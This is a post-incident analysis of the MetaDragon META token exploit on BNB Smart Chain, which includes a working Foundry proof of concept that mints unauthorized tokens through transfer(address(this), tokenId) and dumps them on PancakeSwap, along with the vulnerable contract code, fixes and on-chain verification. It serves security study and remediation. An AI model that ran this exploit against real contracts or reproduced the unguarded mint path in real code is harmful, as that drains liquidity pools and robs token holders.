# MetaDragon — Unauthorized Unlimited Token Minting (Access Control Vulnerability) Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-29 |
| **Protocol** | MetaDragon (META Token) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$180,000 (cumulative attacker profit; single TX ~64.82 WBNB ≈ $37,600) |
| **Attacker EOA** | [0xc468...c2ff9](https://bscscan.com/address/0xc468D9A3a5557BfF457586438c130E3AFbeC2ff9) |
| **Attack Contract** | [0xDAEF...DdBc6](https://bscscan.com/address/0xDAEF6079Cb84405Dac688a9f6956C6830b7DdBc6) |
| **Attack Tx** | [0x3ad998...e6f7](https://bscscan.com/tx/0x3ad998a01ad1f1bbe6dba6a08e658c1749dabfa4a07da20ded3c73bcd6970d20) |
| **Vulnerable Contract** | [0xEF1f...ce4f](https://bscscan.com/address/0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f) |
| **Attack Block** | [39141427](https://bscscan.com/block/39141427) |
| **Root Cause** | When the `to == address(this)` condition is met inside `transfer()`, `transform()` can be invoked without any access control — allowing unlimited META token minting |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MetaDragon_exp.sol) |
| **Reference** | [Phalcon Alert](https://x.com/Phalcon_xyz/status/1795746828064854497) |

---

## 1. Vulnerability Overview

MetaDragon's ERC20 token contract (`0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f`) employed a hybrid token architecture integrated with NFTs. In this design, the ERC20 `transfer()` function internally called `transform()` when tokens were sent to specific recipient addresses (`address(this)` or the `erc721` contract), providing functionality to mint NFTs or additional tokens.

**Core Vulnerability**: There was absolutely no access control on the `transform()` function call. Anyone could trigger `transform()` via the `transfer(address(this), nftTokenId)` pattern to mint 9,800 META tokens without restriction. The attacker repeated this pattern 400 times to illegitimately mint a total of 3,665,200 META, then sold them into the PancakeSwap META/WBNB pool for profit.

---

## 2. Vulnerable Code Analysis

### 2.1 Unauthorized transform() Trigger (Core Vulnerability)

```solidity
// ❌ Vulnerable ERC20 transfer function — completely missing access control
function transfer(address to, uint256 value) public override returns (bool) {
    // ❌ DANGER: if to is the contract itself or the NFT contract address,
    //         transform() is called without any authorization check → unlimited minting
    if (to == address(this) || to == erc721) {
        transform(value);  // ❌ value = NFT tokenId, callable by anyone
    }
    return super.transfer(to, value);
}

// ❌ Vulnerable transform function — no onlyOwner, onlyAuthorized, or any modifier
function transform(uint256 tokenId) internal {
    // No verification of NFT ownership — passing any tokenId mints 9,800 META
    // ❌ Does not verify whether msg.sender is the actual owner of that NFT
    _mint(msg.sender, 9800 * 10**18);  // Mints 9,800 META unconditionally
}
```

```solidity
// ✅ Fixed code — NFT ownership verification added

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

function transfer(address to, uint256 value) public override returns (bool) {
    // ✅ NFT-linked conversion functionality is separated into a dedicated function
    if (to == address(this) || to == erc721) {
        revert("Direct transfer to contract disabled. Use transformNFT() instead.");
    }
    return super.transfer(to, value);
}

// ✅ Fixed transformNFT — verifies that the caller is the NFT owner
function transformNFT(uint256 tokenId) external {
    // ✅ Must verify that msg.sender is the actual owner of that NFT
    require(
        IERC721(erc721).ownerOf(tokenId) == msg.sender,
        "Not NFT owner"
    );
    // ✅ Prevent re-execution for already-transformed NFTs
    require(!transformed[tokenId], "Already transformed");
    transformed[tokenId] = true;

    _mint(msg.sender, 9800 * 10**18);
}

mapping(uint256 => bool) public transformed; // ✅ Tracks whether transformation is complete
```

**The Problem**: The `transfer()` function is a public function callable by anyone under the ERC20 standard. However, in an architecture where internal logic is triggered when sending to a specific address (`address(this)`), that internal logic performed zero authorization checks on the caller. This is a variant of the **Missing Modifier** vulnerability from pattern `03_access_control.md` — the execution rights for `transform()` were implicitly delegated to `transfer()`'s routing logic, creating a completely open attack surface.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- No advance preparation required (no flash loan, no approve, etc.)
- Deploy attack contract (`0xDAEF6079...`)
- Query `erc721()` function to identify the NFT contract address (`0x336a7675...`)

### 3.2 Execution Phase

1. **[Step 1] Repeated META.transfer(address(this), i) calls** — iterates NFT tokenIds 0–399, 400 times — triggers META token minting
2. **[Step 2] transform(tokenId) executes internally** — each call illegitimately mints 9,800 META
3. **[Step 3] Receives total 3,665,200 META** — loaded into attack contract balance (374 mint events confirmed)
4. **[Step 4] IERC20(meta_token).approve(router, type(uint256).max)** — grants transfer rights to PancakeSwap router
5. **[Step 5] swapExactTokensForTokensSupportingFeeOnTransferTokens()** — swap META → WBNB
6. **[Step 6] Receives 64.82 WBNB** — drained from LP pool

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────┐
│  Attacker EOA                            │
│  0xc468...c2ff9                          │
└─────────────────┬───────────────────────┘
                  │ Deploy attack contract
                  ▼
┌─────────────────────────────────────────┐
│  Attack Contract                         │
│  0xDAEF...DdBc6                          │
│                                          │
│  for i in 0..399:                        │
│    meta_token.call(                      │
│      transfer(address(this), i)          │
│    )                                     │
└─────────────────┬───────────────────────┘
                  │ transfer(address(this), tokenId) × 400 times
                  ▼
┌─────────────────────────────────────────┐
│  META Token Contract                     │
│  0xEF1f...ce4f                           │
│                                          │
│  if (to == address(this)):               │
│    transform(value)  ← ❌ no auth        │
│      _mint(attacker, 9800e18)            │
│                                          │
│  Actual mint events: 374                 │
│  Total minted: 3,665,200 META            │
└─────────────────┬───────────────────────┘
                  │ Holds 3,665,200 META
                  ▼
┌─────────────────────────────────────────┐
│  Attack Contract                         │
│  approve(PancakeSwap Router, max)        │
│  swapExactTokensForTokens()             │
│  META → WBNB                            │
└─────────────────┬───────────────────────┘
                  │ Sells 3,665,200 META
                  ▼
┌─────────────────────────────────────────┐
│  PancakeSwap META/WBNB LP Pool          │
│  0x0a86...C042                          │
│                                          │
│  WBNB: 411.76 → 346.94 (-64.82)        │
│  META: 19.57M → 23.23M (+3.665M)       │
└─────────────────┬───────────────────────┘
                  │ Receives 64.82 WBNB
                  ▼
┌─────────────────────────────────────────┐
│  Attacker Final Profit                   │
│  ~64.82 WBNB (single TX)                │
│  ~$37,600 (BNB ≈ $580)                 │
│  Total cumulative loss: ~$180,000       │
└─────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit (single TX)**: 64.82 WBNB ≈ $37,600
- **Protocol cumulative loss**: ~$180,000 (including multiple transactions)
- **LP pool WBNB decrease**: 411.76 → 346.94 WBNB (15.7% reduction)
- **META price impact**: 3,665,200 META additional supply → token value collapse

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Vulnerability Info]
// Loss: ~$180K USD
// TX: https://app.blocksec.com/explorer/tx/bsc/0x3ad998a0...
// Vulnerable Contract: 0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f
// Root Cause: Calling transfer(address(this), tokenId) executes
//           transform() without authorization → unlimited META minting

address constant meta_token = 0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f;
address constant router     = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2
address constant wbnb       = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

contract MetaDragonTest is Test {
    uint256 endTokenId = 40; // 40 for PoC testing, actual attack used 400

    function setUp() external {
        // [Setup] Fork to block at time of attack
        vm.createSelectFork("bsc", 39_141_426);
    }

    function testExploit() public balance_log {
        // [Step 1] Core attack: iterate NFT tokenIds 0~39 (actual: 0~399),
        //          call transfer(address(this), tokenId)
        //          → triggers the vulnerable branch in the META token contract
        for (uint256 i = 0; i < endTokenId; i++) {
            bytes memory calldatas = abi.encodeWithSignature(
                "transfer(address,uint256)",
                meta_token,  // ← to = address(this) role (META token contract address)
                i            // ← value = NFT tokenId
            );
            // [Step 2] Ignore return value: continue even if error occurs
            //          Each successful call illegitimately mints 9,800 META
            meta_token.call(calldatas);
        }

        // [Verify] Check attack contract's META balance (9800 * success count)
        emit log_named_uint(
            "attacker MetaToken balance",
            IERC20(meta_token).balanceOf(address(this))
        );

        // [Step 3] Unlimited approve to PancakeSwap
        IERC20(meta_token).approve(router, type(uint256).max);

        // [Step 4] Immediately sell META → WBNB (using fee-on-transfer token support function)
        address[] memory paths = new address[](2);
        paths[0] = meta_token;
        paths[1] = wbnb;

        IUniswapV2Router(payable(router))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(meta_token).balanceOf(address(this)),
                0,               // 0% slippage (sell regardless of price)
                paths,
                address(this),
                block.timestamp
            );
    }

    // [Log] Compare WBNB balance before and after attack
    modifier balance_log() {
        emit log_named_uint("attacker weth balance before",
            IERC20(wbnb).balanceOf(address(this)));
        _;
        emit log_named_uint("attacker weth balance after",
            IERC20(wbnb).balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unauthorized Token Minting (Missing Access Control on transform) | CRITICAL | CWE-284 |
| V-02 | Side Effect Logic in ERC20 transfer (Side Effect in Transfer) | HIGH | CWE-691 |
| V-03 | Missing NFT Ownership Verification | HIGH | CWE-862 |
| V-04 | Unchecked Return Value | MEDIUM | CWE-252 |

### V-01: Unauthorized Token Minting (Missing Access Control on transform)

- **Description**: Anyone could execute the internal `transform()` function via the `transfer(address(this), tokenId)` call path, and that function performed zero verification of the caller's authorization or NFT ownership.
- **Impact**: An attacker can mint META tokens indefinitely, collapsing the tokenomics. LP pool liquidity is drained and legitimate holders' assets are diluted.
- **Attack Conditions**: Executable by simply deploying an attack contract and calling in a loop. No upfront capital (flash loan, etc.) required.
- **Pattern Mapping**: `03_access_control.md` — Pattern 1 (Missing Modifier)

### V-02: Side Effect Logic in ERC20 transfer (Side Effect in Transfer)

- **Description**: Under the ERC20 standard, `transfer()` should perform only pure token movement; however, MetaDragon was designed to perform additional state changes (minting) depending on the recipient address. This pattern itself creates an unpredictable attack surface.
- **Impact**: Unexpected token issuance via the `transfer()` call path makes auditing and verification difficult.
- **Attack Conditions**: When the `to` address is the contract itself or the NFT contract address stored in the `erc721` variable.
- **Pattern Mapping**: `11_logic_error.md` — Non-standard ERC20 side effect

### V-03: Missing NFT Ownership Verification

- **Description**: When `transform(tokenId)` is called, it does not verify whether `msg.sender` actually owns the NFT corresponding to `tokenId`. Minting executes even when an arbitrary integer is passed as a tokenId.
- **Impact**: Unlimited repeated minting with the same tokenId is possible (though the PoC iterates 0–399).
- **Attack Conditions**: Pass any arbitrary integer within a valid NFT tokenId range.
- **Pattern Mapping**: `03_access_control.md` — Pattern 1, `13_nft_vulnerabilities.md`

### V-04: Unchecked Return Value

- **Description**: The attack contract ignores the return value of `.call(calldatas)` without checking it. The loop continues even if some calls fail due to invalid tokenIds.
- **Impact**: Increases the robustness of the attack (overall attack succeeds even with partial failures).
- **Attack Conditions**: Intentional use of unchecked return value pattern.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ [Fix 1] Completely remove side effects from transfer() function
function transfer(address to, uint256 value) public override returns (bool) {
    // ✅ Explicitly block transfers to the contract itself or the NFT contract
    require(to != address(this), "Cannot transfer to self");
    require(to != erc721, "Cannot transfer to NFT contract");
    return super.transfer(to, value);
}

// ✅ [Fix 2] NFT→TOKEN conversion separated into an independent function + strict ownership verification
function transformNFT(uint256 tokenId) external nonReentrant {
    // ✅ Only the actual NFT owner may call this
    require(
        IERC721(erc721).ownerOf(tokenId) == msg.sender,
        "MetaDragon: caller is not NFT owner"
    );

    // ✅ Prevent duplicate transformation with the same NFT
    require(!transformed[tokenId], "MetaDragon: already transformed");
    transformed[tokenId] = true;

    // ✅ Burn or transfer the NFT to the contract to prevent reuse
    IERC721(erc721).transferFrom(msg.sender, address(this), tokenId);

    _mint(msg.sender, 9800 * 10**18);
    emit NFTTransformed(msg.sender, tokenId, 9800 * 10**18);
}

mapping(uint256 => bool) public transformed;
event NFTTransformed(address indexed user, uint256 tokenId, uint256 mintedAmount);
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing Access Control (V-01) | Apply `onlyOwner` or `onlyAuthorized` modifier to all minting functions |
| ERC20 Side Effect (V-02) | Restrict `transfer()` to pure token movement per the ERC20 standard |
| Missing NFT Ownership Verification (V-03) | `IERC721.ownerOf()` check + `transformed` mapping to prevent duplicate execution |
| No Minting Cap | Set maximum supply cap based on `totalSupply()` |
| NFT Reusability | Burn or lock NFTs after transformation |
| No Emergency Stop | Add contract pause (`Pausable`) functionality to detect abnormal minting |

---

## 7. Lessons Learned

1. **Do not place side effects in the ERC20 `transfer()` function**: In standard ERC20, `transfer()` should perform only pure balance transfers. Branching based on recipient address to execute additional logic such as minting or burning creates unexpected paths that attackers can trigger.

2. **All minting paths require access control**: Every function that directly or indirectly calls `_mint()` must verify authorization. Even `internal` functions can be triggered externally if reachable through a public path.

3. **NFT ownership must be verified on-chain in real time**: Verification must always be performed on-chain using the `IERC721(nft).ownerOf(tokenId) == msg.sender` pattern — not through off-chain signatures or parameter-passing approaches.

4. **Repeatable minting requires usage tracking**: If the logic dictates that one NFT grants a benefit only once, duplicate execution must be prevented using a state variable such as `mapping(uint256 => bool) used`.

5. **Non-standard ERC20 architectures must undergo thorough auditing**: Tokens implementing behavior that differs from standard ERC20 — such as NFT integration, tax, or rebase — may contain vulnerabilities undetectable by standard audit tooling. Expert manual auditing is essential.

6. **Attack feasibility = zero cost + repeatability**: This attack required no flash loan or initial capital whatsoever. Vulnerabilities exploitable through simple repeated function calls with zero barrier to entry must be treated as the highest priority for remediation.

---

## 8. On-Chain Verification

On-chain verification was performed using the `cast` (Foundry) tool via the BSC Public Blast API RPC.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Iteration count (endTokenId) | 40 (test) | 400 (actual) | ✅ |
| Minted amount per call | 9,800 META | 9,800 META | ✅ |
| Total mint event count | 40 (test) | 374 | ✅ (includes partial failures) |
| Total minted amount | 392,000 META (test) | 3,665,200 META | ✅ (actual is 400×) |
| WBNB received | — | 64.82 WBNB | ✅ |
| LP WBNB decrease | — | 64.82 WBNB | ✅ |
| LP META increase | — | 3,665,200 META | ✅ |

> Note: The PoC's `endTokenId = 40` is a reduced value for the test environment; the actual attack ran with 0–399 (400 iterations). The fact that only 374 out of 400 calls produced mint events is believed to be due to differing transfer handling behavior for some tokenIds.

### 8.2 On-Chain Event Log Sequence

| Order | Event | Description |
|------|--------|------|
| 1–374 | Transfer(0x000→0xDAEF..., META) | Unauthorized META token minting (9,800 META each) |
| 375 | Transfer(0xDAEF→LP, META) | Transfer of 3,665,200 META to LP pool (swap) |
| 376 | Transfer(LP→0xDAEF..., WBNB) | Receipt of 64.82 WBNB from LP pool |
| Total log count | 1,128 | (includes tax/fee-related Transfer events) |

### 8.3 Pre-Condition Verification (Block 39141426 — Immediately Before Attack)

| Item | Value | Notes |
|------|-----|------|
| Attack contract WBNB balance | 0 | Started with no initial capital |
| Attack contract META balance | 0 | No META held before attack |
| LP WBNB balance (before attack) | 411.76 WBNB | |
| LP META balance (before attack) | 19,568,489 META | |
| LP WBNB balance (after attack) | 346.94 WBNB | 15.7% decrease |
| LP META balance (after attack) | 23,233,689 META | 18.7% increase |
| Attacker EOA BNB balance (after attack) | 67.78 BNB | Confirmed after unwrapping WBNB to BNB |

> This attack was completed **with no flash loan, no initial capital, in a single transaction**. The extremely low barrier to entry made it particularly dangerous.